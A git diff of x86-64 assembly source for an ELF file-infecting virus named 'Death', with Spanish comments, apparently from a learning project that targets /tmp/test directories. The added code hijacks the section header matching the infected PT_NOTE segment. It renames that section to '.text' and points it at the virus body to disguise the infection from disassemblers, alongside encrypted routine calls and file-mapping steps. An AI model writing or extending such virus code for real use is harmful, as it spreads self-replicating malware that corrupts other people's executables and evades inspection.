@@ -666,7 +666,6 @@ section .text
     .mmap:
 
         CALL_ENCRYPT(mmap)
-
         test rax, rax
         jle .close_file
         mov VAR(Death.mmap_ptr), rax   ; save mmap_ptr
@@ -739,8 +738,88 @@ section .text
         CALL_ENCRYPT(ftruncate)
         jnz .munmap
 
+    ; La historia de esto es que con el objdump -D no imprime la seccion
+    ; infectada porque no tiene un section header apuntandole. Aqui secuestramos
+    ; el section header que se corresponde con el pt note que hemos usado para
+    ; la infeccion para que apunte a nuestro código.
+    .load_relevant_section_headers:
+
+        mov rax, VAR(Death.note_phdr_ptr)
+        mov r8, [rax + Elf64_Phdr.p_offset]
+
+        ; Buscamos un section header cuyo offset coincida con el offset del phdr.
+        mov rax, VAR(Death.mmap_ptr)        ; Elf64_Ehdr está al principio del mapeo
+        mov rbx, [rax + Elf64_Ehdr.e_shoff]
+        add rbx, rax                        ; map + offset = direccion del shtab
+        movzx edx, word [rax + Elf64_Ehdr.e_shnum]
+
+        ; iteramos los program headers.
+        .search_note_section_header:
+            test rdx, rdx
+            jz .munmap
+            ; si el offset coincide, es el que buscamos. No puede haber solapamiento aquí
+            cmp r8, [rbx + Elf64_Shdr.sh_offset]
+            je .save_note_shdr_ptr
+
+            ; siguiente iteracion
+            dec rdx
+            add rbx, Elf64_Shdr_size
+            jmp .search_note_section_header
+
+        .save_note_shdr_ptr:
+            mov VAR(Death.note_shdr_ptr), rbx
+
+        .get_shstrtab:
+            ; cargamos el indice del section header array que se corresponde
+            ; con la shstrtab
+            movzx ebx, word [rax + Elf64_Ehdr.e_shstrndx]
+
+            ; r8 = inicio del section header array (perderemos rax en la multiplicacion)
+            mov r8, [rax + Elf64_Ehdr.e_shoff]
+            add r8, rax
+
+            ; calculamos rax = e_shstrndx * Elf64_Shdr_size
+            xor edx, edx
+            mov rax, Elf64_Shdr_size
+            mul rbx
+
+            ; sumamos el offset al inicio del array
+            add r8, rax
+
+            ; r8 apunta ahora al section header del shstrtab.
+            mov rax, VAR(Death.mmap_ptr)          ; rax = map_ptr
+            add rax, [r8 + Elf64_Shdr.sh_offset]  ; rax += *(r8 + lf64_Shdr.sh_offset)
+
+            ; rax apunta ahora al inicio de la shstrtab
+            mov VAR(Death.shstrtab_ptr), rax
+
     .mod_pt_note:
         CALL_ENCRYPT(mod_pt_note)
+
+    .mod_sh_note:
+        ; rsi = shstrab_ptr + note_shdr_ptr.sh_name = el nombre original de la seccion.
+        mov rax, VAR(Death.note_shdr_ptr)
+        ; ponemos a cero porque vamos a cargar un numero de 4 bits. Si tiene
+        ; basura el registro, luego al sumar nos da un numero gigante.
+        xor rbx, rbx
+        mov ebx, [rax + Elf64_Shdr.sh_name]
+        mov rdi, VAR(Death.shstrtab_ptr)
+        add rdi, rbx
+
+        ; ponemos .text\0 donde queriamos poner
+        lea rsi, [rel text_section_str]
+        mov rcx, 6 ; len(".text\0")
+        cld
+        rep movsb
+
+        ; sh_offset = virus_offset
+        mov rbx, VAR(Death.virus_offset)
+        mov [rax + Elf64_Shdr.sh_offset], rbx
+
+        ; sh_size = virus_size
+        xor rbx, rbx
+        mov ebx, dword VAR(Death.virus_size)
+        mov [rax + Elf64_Shdr.sh_size], rbx
 
     .unique_trace:
         xor rax, rax
@@ -862,6 +941,7 @@ section .text
     exe_string      db      0x2F,0x65,0x78,0x65,0 ;"/exe",0 ; 5
     dirs            db      0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0,0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0x32,0,0  ;"/tmp/test",0,"/tmp/test2",0,0
     proc            db      0x2F,0x70,0x72,0x6F,0x63,0x2f,0 ; "/proc/",0 ; 7
+    text_section_str db     ".text",0
     __F_data__end:
     host_entrypoint dq      _dummy_host_entrypoint
     virus_vaddr     dq      _start
